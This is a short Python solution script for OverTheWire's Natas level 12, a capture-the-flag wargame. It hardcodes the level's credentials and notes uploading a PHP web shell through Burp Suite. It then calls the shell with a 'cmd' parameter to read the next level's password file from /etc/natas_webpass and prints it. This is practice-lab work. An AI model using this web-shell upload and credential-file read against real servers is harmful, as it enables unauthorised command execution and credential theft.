#!/usr/bin/env python3

import requests

username = 'natas12'
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'

url = 'http://%s.natas.labs.overthewire.org' % username

# response = requests.get(url, auth=(username, password))
# content = response.text

# use burp suite to upload shell php
# http://natas12.natas.labs.overthewire.org/upload/fprqvursey.php?cmd=

url_flag = url + '/upload/fprqvursey.php?cmd=cat%20/etc/natas_webpass/natas13'
response = requests.get(url_flag, auth=(username, password))
flag = response.text

print(flag)